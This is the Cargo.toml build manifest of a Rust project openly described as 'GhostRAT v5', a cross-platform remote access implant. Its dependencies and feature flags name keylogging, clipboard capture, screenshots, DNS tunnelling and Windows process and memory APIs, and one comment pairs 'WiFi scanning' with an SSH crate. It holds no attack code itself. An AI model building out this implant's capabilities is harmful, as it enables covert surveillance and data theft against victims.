[package]
name = "ghostrat-native"
version = "5.0.0"
edition = "2021"
description = "GhostRAT v5 — cross-platform native implant with GPU compute shaders"
authors = ["Giorgi Pirveli"]
license = "MIT"
rust-version = "1.75"

[[bin]]
name = "ghost"
path = "src/main.rs"

[dependencies]
# Async runtime
tokio = { version = "1", features = ["full"] }
async-trait = "0.1"
futures = "0.3"

# HTTP client
reqwest = { version = "0.12", features = ["json", "stream"] }

# Serialization
serde = { version = "1", features = ["derive"] }
serde_json = "1"

# Error handling
anyhow = "1"
thiserror = "1"

# UUID generation
uuid = { version = "1", features = ["v4"] }

# Config / env
dotenv = "0.15"
clap = { version = "4", features = ["derive"] }

# Time
chrono = { version = "0.4", features = ["serde"] }

# Crypto / encoding
hex = "0.4"
base64 = "0.22"
crc8 = "0.1"

# Random
rand = "0.8"

# Image processing (screenshot compression)
image = { version = "0.25", default-features = false, features = ["jpeg"] }

# Platform dirs
dirs = "5"

# Clipboard access
clipboard = "0.5"

# WebGPU (optional)
wgpu = { version = "23", optional = true }
bytemuck = "1"

# x86 instructions (rdtsc, etc.)
x86 = { version = "0.52", optional = true }

# evdev for Linux keylogger (optional)
evdev = { version = "0.12", optional = true }

# Cross-platform input
input-rs = { version = "0.3", optional = true }

# DNS resolution
hickory-resolver = { version = "0.24", optional = true }
urlencoding = "2"

# BLE advertising — uses platform APIs directly (no external crate needed)

# WiFi scanning (optional)
russh = { version = "0.43", optional = true }

# Vulkan (optional)
vulkano = { version = "0.32", optional = true }

# Logging
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter"] }

# Compression
flate2 = "1"
tar = "0.4"

# Path walking
walkdir = "2"

# File metadata
filetime = "0.2"

# System info
hostname = "0.4"
whoami = "1"
num_cpus = "1"

# Platform-specific
[target.'cfg(windows)'.dependencies]
windows = { version = "0.58", features = [
    "Win32_Foundation",
    "Win32_Security",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_Memory",
    "Win32_System_ProcessStatus",
    "Win32_System_Threading",
    "Win32_UI_WindowsAndMessaging",
    "Win32_Graphics_Gdi",
    "Win32_System_SystemServices",
    "Win32_System_Diagnostics_ToolHelp",
    "Win32_Networking_WinSock",
    "Win32_Networking_WinHttp",
    "Win32_System_Pipes",
    "Win32_NetworkManagement_IpHelper",
    "Win32_System_SystemInformation",
    "Win32_Storage_FileSystem",
] }

[target.'cfg(target_os = "macos")'.dependencies]
core-foundation = "0.9"
core-graphics = "0.23"
core-text = "21"
objc = "0.2"
objc-foundation = "0.1"
sysctl = { version = "0.4", optional = true }

[target.'cfg(target_os = "linux")'.dependencies]
nix = { version = "0.32", features = ["fs", "ioctl", "user"] }

[features]
default = ["gpu-webgpu", "keylogger-linux"]
gpu-webgpu = ["dep:wgpu"]
vulkan = ["dep:wgpu", "dep:vulkano"]
keylogger-linux = ["dep:evdev"]
keylogger-macos = []
dns-tunnel = ["dep:hickory-resolver"]
wifi-beacon = []

[profile.release]
opt-level = 3
lto = true
strip = true
codegen-units = 1
panic = "abort"
